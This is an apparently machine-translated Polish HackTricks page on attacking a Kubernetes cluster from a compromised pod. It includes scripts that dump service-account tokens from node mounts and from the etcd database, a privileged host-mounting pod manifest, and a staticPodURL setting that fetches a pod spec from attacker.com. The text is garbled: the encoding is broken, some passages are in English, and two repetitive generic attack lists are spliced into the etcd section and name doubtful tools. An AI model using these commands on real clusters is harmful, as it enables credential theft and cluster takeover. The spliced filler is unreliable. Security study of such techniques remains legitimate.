# Atakowanie Kubernetesa z wntrza Poda

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Ucieczka z Poda**

**Jeli masz szczcie, mo偶esz uciec z niego do wza:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Ucieczka z Poda

Aby spr贸bowa uciec z Poda, mo偶esz najpierw potrzebowa **podwy偶szenia uprawnie**, niekt贸re techniki do tego:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Mo偶esz sprawdzi te **przeamania dockerowe, aby spr贸bowa uciec** z poda, kt贸ry zosta skompromitowany:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Nadu偶ywanie uprawnie Kubernetes

Jak wyjaniono w sekcji dotyczcej **enumeracji Kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Zazwyczaj pody s uruchamiane z **tokenem konta usugi** wewntrz nich. To konto usugi mo偶e mie przypisane pewne **uprawnienia**, kt贸re mo偶na **nadu偶y**, aby **przej** do innych pod贸w lub nawet **uciec** do skonfigurowanych w klastrze wz贸w. Sprawd藕, jak to zrobi:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Nadu偶ywanie uprawnie chmury

Jeli pod jest uruchamiany w **rodowisku chmurowym**, mo偶esz pr贸bowa **wyciec token z punktu kocowego metadanych** i podwy偶szy uprawnienia, u偶ywajc go.

## Wyszukiwanie podatnych usug sieciowych

Jako 偶e jeste w rodowisku Kubernetes, jeli nie mo偶esz podwy偶szy uprawnie, nadu偶ywajc obecnych uprawnie pod贸w, i nie mo偶esz uciec z kontenera, powiniene **szuka potencjalnie podatnych usug.**

### Usugi

**W tym celu mo偶esz spr贸bowa uzyska wszystkie usugi rodowiska Kubernetes:**
```
kubectl get svc --all-namespaces
```
Domylnie Kubernetes u偶ywa paskiego schematu sieciowego, co oznacza, 偶e **ka偶dy pod/usuga w klastrze mo偶e komunikowa si z innymi**. **Przestrzenie nazw** w klastrze **nie maj domylnie 偶adnych ogranicze dotyczcych bezpieczestwa sieciowego**. Ka偶dy w przestrzeni nazw mo偶e komunikowa si z innymi przestrzeniami nazw.

### Skanowanie

Nastpujcy skrypt Bash (pobrany z [warsztatu Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) zainstaluje i przeskanuje zakresy IP klastra Kubernetes:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Sprawd藕 nastpujc stron, aby dowiedzie si, jak mo偶na **atakowa specyficzne usugi Kubernetes**, aby **skompromitowa inne pody/cae rodowisko**:

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### Podsuchiwanie

W przypadku, gdy **skompromitowany pod uruchamia wra偶liw usug**, gdzie inne pody musz si uwierzytelni, mo偶esz pr贸bowa uzyska powiadczenia wysyane przez inne pody, **podgldajc lokalne komunikacje**.

## Podrabianie sieci

Domylnie techniki takie jak **podrabianie ARP** (i dziki temu **podrabianie DNS**) dziaaj w sieci Kubernetes. Nastpnie, wewntrz poda, jeli masz **uprawnienia NET\_RAW** (kt贸re s domylnie dostpne), bdziesz m贸g wysya niestandardowo skonstruowane pakiety sieciowe i przeprowadza **ataki typu MitM za pomoc podrabiania ARP na wszystkie pody dziaajce na tym samym w藕le.**\
Ponadto, jeli **zoliwy pod** dziaa na **tym samym w藕le co serwer DNS**, bdziesz m贸g przeprowadzi **atak podrabiania DNS na wszystkie pody w klastrze**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

W manifestach Kubernetes nie ma okrelonych zasob贸w ani **ogranicze** dla kontener贸w. Jako atakujcy, mo偶emy **zu偶y wszystkie zasoby, na kt贸rych dziaa pod/deployment**, wyczerpujc inne zasoby i powodujc DoS dla rodowiska.

Mo偶na to zrobi za pomoc narzdzia takiego jak [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Mo偶esz zobaczy r贸偶nic podczas uruchamiania `stress-ng` i po nim.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Node Post-Exploitation

Jeli udao ci si **wydosta z kontenera**, znajdziesz kilka interesujcych rzeczy w w藕le:

* Proces **Container Runtime** (Docker)
* Wicej **pods/containers** dziaajcych na w藕le, kt贸re mo偶na wykorzysta, tak jak ten (wicej token贸w)
* Cay **system plik贸w** i **system operacyjny** og贸lnie
* Serwis **Kube-Proxy** nasuchujcy
* Serwis **Kubelet** nasuchujcy. Sprawd藕 pliki konfiguracyjne:
* Katalog: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* Inne **wsp贸lne pliki Kubernetes**:
* `$HOME/.kube/config` - **Konfiguracja u偶ytkownika**
* `/etc/kubernetes/kubelet.conf`- **Konfiguracja regularna**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Konfiguracja rozruchowa**
* `/etc/kubernetes/manifests/etcd.yaml` - **Konfiguracja etcd**
* `/etc/kubernetes/pki` - **Klucz Kubernetes**

### Znajd藕 kubeconfig wza

Jeli nie mo偶esz znale藕 pliku kubeconfig w jednym z wczeniej wspomnianych cie偶ek, **sprawd藕 argument `--kubeconfig` procesu kubelet**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Kradzie偶 sekret贸w

To steal secrets from within a Kubernetes pod, you can use various techniques. Here are some common methods:

#### 1. Environment Variables

If the application running inside the pod uses environment variables to store sensitive information, you can access these variables from within the pod. Use the `env` command to list all the environment variables and look for any that may contain secrets.

#### 2. Mounted Volumes

Check if the pod has any mounted volumes. If the sensitive information is stored in a file within the volume, you can access it by reading the file from within the pod.

#### 3. API Access

If the pod has access to the Kubernetes API, you can use this access to retrieve secrets. Use the appropriate API calls to list and retrieve secrets from the cluster.

#### 4. Service Accounts

If the pod is using a service account, check if it has any permissions to access secrets. If so, you can use the service account's credentials to retrieve the secrets.

#### 5. Reverse Shell

If you have the ability to execute commands within the pod, you can establish a reverse shell to gain interactive access. This allows you to navigate the file system and search for any files or environment variables that may contain secrets.

Remember to always follow ethical guidelines and obtain proper authorization before attempting any of these techniques.
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Skrypt [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) automatycznie **pobierze tokeny innych pod贸w i sprawdzi, czy maj uprawnienia**, kt贸rych szukasz (zamiast sprawdzania ich pojedynczo):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Przywilejowane DaemonSets

DaemonSet to **pod**, kt贸ry bdzie **uruchamiany** na **wszystkich wzach klastra**. Dlatego jeli DaemonSet jest skonfigurowany z **uprzywilejowanym kontem usugi**, na **wszystkich wzach** bdziesz m贸g znale藕 **token** tego **uprzywilejowanego konta usugi**, kt贸ry mo偶na wykorzysta.

Wykorzystanie jest takie samo jak w poprzedniej sekcji, ale teraz nie zale偶y to od szczcia.

### Przejcie do chmury

Jeli klaster jest zarzdzany przez usug chmurow, zazwyczaj **wze bdzie mia inny dostp do punktu kocowego metadanych** ni偶 Pod. Dlatego spr贸buj **uzyska dostp do punktu kocowego metadanych z wza** (lub z pod z hostNetwork ustawionym na True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Kradzie偶 etcd

Jeli mo偶esz okreli [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) wza, na kt贸rym zostanie uruchomiony kontener, uzyskaj powok w w藕le kontrolnym i pobierz baz danych **etcd**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
Wzy **control-plane** maj rol **master** i w **zarzdzanych klastrach w chmurze nie bdziesz w stanie uruchomi na nich niczego**.

#### Odczytywanie sekret贸w z etcd

Jeli mo偶esz uruchomi sw贸j pod na w藕le **control-plane** za pomoc selektora `nodeName` w specyfikacji poda, mo偶esz atwo uzyska dostp do bazy danych `etcd`, kt贸ra zawiera wszystkie konfiguracje klastra, w tym wszystkie sekrety.

Poni偶ej znajduje si szybki i niezbyt elegancki spos贸b na pobranie sekret贸w z `etcd`, jeli dziaa on na w藕le **control-plane**, na kt贸rym si znajdujesz. Jeli chcesz bardziej eleganckiego rozwizania, kt贸re uruchamia pod z narzdziem klienta `etcdctl` i u偶ywa powiadcze wza **control-plane** do poczenia si z `etcd`, gdziekolwiek jest uruchomiony, sprawd藕 [ten przykadowy manifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) od @mauilion.

**Sprawd藕, czy `etcd` dziaa na w藕le control-plane i zobacz, gdzie znajduje si baza danych (To jest na klastrze utworzonym za pomoc `kubeadm`)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
# Atakowanie Kubernetes z wntrza poda

W przypadku, gdy uzyskamy dostp do kontenera w klastrze Kubernetes, mo偶emy przeprowadzi atak na sam klaster. Poni偶ej przedstawiam kilka technik, kt贸re mo偶na zastosowa w celu eskalacji uprawnie i uzyskania dostpu do zasob贸w klastra.

## 1. Wykorzystanie podatnoci w wersji Kubernetes

Sprawd藕, czy wersja Kubernetes, na kt贸rej dziaa klaster, jest podatna na znane luki bezpieczestwa. Mo偶esz to zrobi, sprawdzajc dokumentacj lub korzystajc z narzdzi takich jak `kubeletctl` lub `kube-hunter`.

## 2. Przechwytywanie tokena serwisowego

Jeli w podzie dziaa serwis, mo偶emy przechwyci token serwisowy, kt贸ry mo偶e nam umo偶liwi dostp do innych zasob贸w klastra. Mo偶emy to zrobi, przechwytujc ruch sieciowy lub wykorzystujc podatnoci w aplikacji serwisu.

## 3. Wykorzystanie podatnoci w aplikacji

Jeli aplikacja w podzie jest podatna na ataki, mo偶emy wykorzysta t podatno do eskalacji uprawnie i uzyskania dostpu do innych zasob贸w klastra. Mo偶emy to zrobi, wykorzystujc narzdzia takie jak `Metasploit` lub `ExploitDB`.

## 4. Atak na kubelet

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa kubelet, kt贸ry zarzdza podem. Mo偶emy to zrobi, wykorzystujc narzdzia takie jak `kubeletctl` lub `kubelet-exploit`.

## 5. Atak na API Kubernetes

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa API Kubernetes. Mo偶emy to zrobi, wykorzystujc narzdzia takie jak `kubectl` lub `kube-api`.

## 6. Wykorzystanie podatnoci w narzdziach i skryptach

Jeli w podzie s zainstalowane narzdzia lub skrypty, kt贸re s podatne na ataki, mo偶emy wykorzysta t podatno do eskalacji uprawnie i uzyskania dostpu do innych zasob贸w klastra.

## 7. Atak na sie klastra

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa sie klastra. Mo偶emy to zrobi, wykorzystujc narzdzia takie jak `Wireshark` lub `tcpdump`.

## 8. Atak na system operacyjny hosta

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa system operacyjny hosta, na kt贸rym dziaa klaster Kubernetes. Mo偶emy to zrobi, wykorzystujc narzdzia takie jak `Metasploit` lub `ExploitDB`.

## 9. Atak na inne pody

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa inne pody w klastrze. Mo偶emy to zrobi, wykorzystujc narzdzia takie jak `kubectl` lub `kube-api`.

## 10. Wykorzystanie podatnoci w konfiguracji klastra

Jeli mamy dostp do kontenera, mo偶emy sprawdzi, czy konfiguracja klastra jest podatna na ataki. Mo偶emy to zrobi, analizujc pliki konfiguracyjne lub korzystajc z narzdzi takich jak `kube-hunter` lub `kube-bench`.
```bash
data-dir=/var/lib/etcd
```
**Wywietlanie danych w bazie danych etcd:**

```bash
kubectl exec -it <pod_name> -- sh
ETCDCTL_API=3 etcdctl get --prefix ""
```

Mo偶esz wywietli dane w bazie danych etcd, wykonujc nastpujce polecenia:

1. Uruchom powok wewntrz kontenera poda za pomoc polecenia `kubectl exec -it <pod_name> -- sh`.
2. Ustaw zmienn rodowiskow `ETCDCTL_API` na warto `3`.
3. Wykonaj polecenie `etcdctl get --prefix ""`, aby wywietli wszystkie dane w bazie danych etcd.
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Wyodrbnij tokeny z bazy danych i poka偶 nazw konta usugi**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**To samo polecenie, ale z dodatkowymi grepami, aby zwr贸ci tylko domylny token w przestrzeni nazw kube-system**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
# Atakowanie Kubernetes z wntrza poda

W przypadku, gdy uzyskamy dostp do kontenera w klastrze Kubernetes, mo偶emy przeprowadzi atak na sam klaster. Poni偶ej przedstawiam kilka technik, kt贸re mo偶na zastosowa w celu eskalacji uprawnie i uzyskania dostpu do zasob贸w klastra.

## 1. Wykorzystanie podatnoci w wersji Kubernetes

Sprawd藕, czy wersja Kubernetes, na kt贸rej dziaa klaster, jest podatna na znane luki bezpieczestwa. Mo偶esz to zrobi, sprawdzajc dokumentacj lub korzystajc z narzdzi takich jak `kubeletctl` lub `kube-hunter`.

## 2. Przechwytywanie tokena serwisowego

Jeli w podzie dziaa serwis, mo偶emy przechwyci token serwisowy, kt贸ry mo偶e nam umo偶liwi dostp do innych zasob贸w klastra. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 3. Wykorzystanie podatnoci w aplikacji

Jeli aplikacja uruchomiona w podzie ma podatnoci, mo偶emy je wykorzysta do eskalacji uprawnie i uzyskania dostpu do innych zasob贸w klastra. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `Metasploit` lub `ExploitDB`.

## 4. Atak na kubelet

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa kubelet, kt贸ry zarzdza podem. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubeletctl` lub `kubelet-exploit`.

## 5. Atak na API serwera

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa API serwera Kubernetes. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 6. Atak na etcd

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa etcd, kt贸ry przechowuje konfiguracj klastra Kubernetes. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `etcdctl` lub `etcd-exploit`.

## 7. Atak na sie klastra

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa sie klastra Kubernetes. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `nmap` lub `Wireshark`.

## 8. Atak na wolumeny

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa wolumeny, kt贸re s u偶ywane przez pod. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 9. Atak na kontrolery replikacji

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa kontrolery replikacji, kt贸re zarzdzaj replikami pod贸w. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 10. Atak na usugi

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa usugi, kt贸re s u偶ywane przez pod. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 11. Atak na przestrzenie nazw

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa przestrzenie nazw, kt贸re s u偶ywane przez pod. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 12. Atak na role i uprawnienia

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa role i uprawnienia, kt贸re s przypisane do pod贸w. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 13. Atak na konfiguracj klastra

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa konfiguracj klastra Kubernetes. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 14. Atak na zasoby klastra

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa zasoby klastra Kubernetes, takie jak wzy, usugi, przestrzenie nazw itp. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 15. Atak na inne pody

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa inne pody w klastrze Kubernetes. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 16. Atak na klastry wielotenantowe

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa inne klastry w rodowisku wielotenantowym. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 17. Atak na dostawc贸w chmur

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa dostawc贸w chmur, kt贸rzy zarzdzaj klastrami Kubernetes. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 18. Atak na narzdzia monitorujce

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa narzdzia monitorujce, kt贸re s u偶ywane w klastrze Kubernetes. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 19. Atak na narzdzia do zarzdzania

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa narzdzia do zarzdzania, kt贸re s u偶ywane w klastrze Kubernetes. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.

## 20. Atak na narzdzia do monitorowania bezpieczestwa

Jeli mamy dostp do kontenera, mo偶emy pr贸bowa atakowa narzdzia do monitorowania bezpieczestwa, kt贸re s u偶ywane w klastrze Kubernetes. Mo偶emy to zrobi, korzystajc z narzdzi takich jak `kubectl` lub `kubeletctl`.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Statyczna/Mirrored Pods Persistence

_Static Pods_ s zarzdzane bezporednio przez demona kubelet na okrelonym w藕le, bez obserwowania ich przez serwer API. W przeciwiestwie do Pod贸w zarzdzanych przez paszczyzn kontroln (na przykad Deployment); zamiast tego, **kubelet obserwuje ka偶dy statyczny Pod** (i restartuje go w przypadku awarii).

Dlatego statyczne Pod-y zawsze s **powizane z jednym Kubeletem** na okrelonym w藕le.

**Kubelet automatycznie pr贸buje utworzy lustrzane Pod-y na serwerze API Kubernetes** dla ka偶dego statycznego Pod-a. Oznacza to, 偶e Pod-y dziaajce na w藕le s widoczne na serwerze API, ale nie mo偶na nimi zarzdza stamtd. Nazwy Pod-贸w bd miay dodany sufiks z nazw hosta wza poprzedzony mylnikiem.

{% hint style="danger" %}
**`spec` statycznego Pod-a nie mo偶e odwoywa si do innych obiekt贸w API** (np. ServiceAccount, ConfigMap, Secret itp.). Nie mo偶na zatem wykorzysta tego zachowania do uruchomienia Pod-a z dowolnym serviceAccount-em na bie偶cym w藕le w celu skompromitowania klastra. Ale mo偶na to wykorzysta do uruchamiania Pod-贸w w r贸偶nych przestrzeniach nazw (jeli jest to przydatne z jakiego powodu).
{% endhint %}

Jeli znajdujesz si wewntrz hosta wza, mo偶esz sprawi, 偶e **utworzy on statyczny Pod wewntrz siebie**. Jest to bardzo przydatne, poniewa偶 mo偶e umo偶liwi **utworzenie Pod-a w innej przestrzeni nazw**, takiej jak **kube-system**.

Aby utworzy statyczny Pod, [**dokumentacja jest bardzo pomocna**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). W zasadzie potrzebujesz 2 rzeczy:

* Skonfiguruj parametr **`--pod-manifest-path=/etc/kubernetes/manifests`** w usudze **kubelet**, lub w konfiguracji **kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) i zrestartuj usug
* Utw贸rz definicj **pod-a** w **`/etc/kubernetes/manifests`**

**Innym, bardziej skrytym sposobem byoby:**

* Zmodyfikuj parametr **`staticPodURL`** w pliku konfiguracyjnym **kubelet** i ustaw co takiego jak `staticPodURL: http://attacker.com:8765/pod.yaml`. Spowoduje to, 偶e proces kubelet utworzy **statyczny Pod**, pobierajc **konfiguracj z podanego adresu URL**.

**Przykad** konfiguracji **pod-a** do utworzenia pod-a z uprawnieniami w **kube-system**, zaczerpnity z [**tutaj**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Usuwanie pod贸w + wz贸w niedopuszczalnych

Jeli atakujcy **skompromituje wze** i bdzie m贸g **usuwa pody** z innych wz贸w oraz **uniemo偶liwi uruchamianie pod贸w na innych wzach**, pody zostan uruchomione na skompromitowanym w藕le, a atakujcy bdzie m贸g **ukra tokeny** uruchamiane w tych podach.\
Aby uzyska [**wicej informacji, kliknij tutaj**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Narzdzia automatyczne

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
